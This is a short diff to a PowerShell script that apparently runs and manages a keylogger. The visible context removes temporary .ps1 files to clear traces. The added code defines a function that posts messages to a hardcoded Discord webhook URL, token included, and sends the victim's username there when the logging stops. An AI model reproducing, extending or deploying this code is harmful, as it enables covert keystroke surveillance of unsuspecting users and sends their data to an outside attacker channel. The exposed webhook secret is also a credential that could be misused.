@@ -49,6 +49,18 @@ function Cleanup-TempScripts {
     Get-ChildItem -Path ([System.IO.Path]::GetTempPath()) -Filter "*.ps1" -File | Remove-Item -Force
 }
 
+# Function to send a message to Discord webhook
+function Send-DiscordMessage {
+    param (
+        [string]$message
+    )
+    $webhookUrl = "https://discord.com/api/webhooks/1272625926668292136/LL8hTxV9YTcY6Qkbc_KZhn2BXVufmLDGAbM0m1m28kbK8cvwlcakiwViAQtrMKO_BA95"
+    $payload = @{
+        content = $message
+    } | ConvertTo-Json
+    Invoke-RestMethod -Uri $webhookUrl -Method Post -ContentType "application/json" -Body $payload
+}
+
 # Trap to handle script termination and perform cleanup
 trap { Cleanup-TempScripts; break }
 
@@ -98,6 +110,9 @@ finally {
     } else {
         Write-Output "Keylogger script does not exist at $keyloggerScriptPath"
     }
+
+    # Send unexpected quit message to Discord
+    Send-DiscordMessage -message "Logging for $env:USERNAME quit unexpectedly"
 
     Cleanup-TempScripts
 }
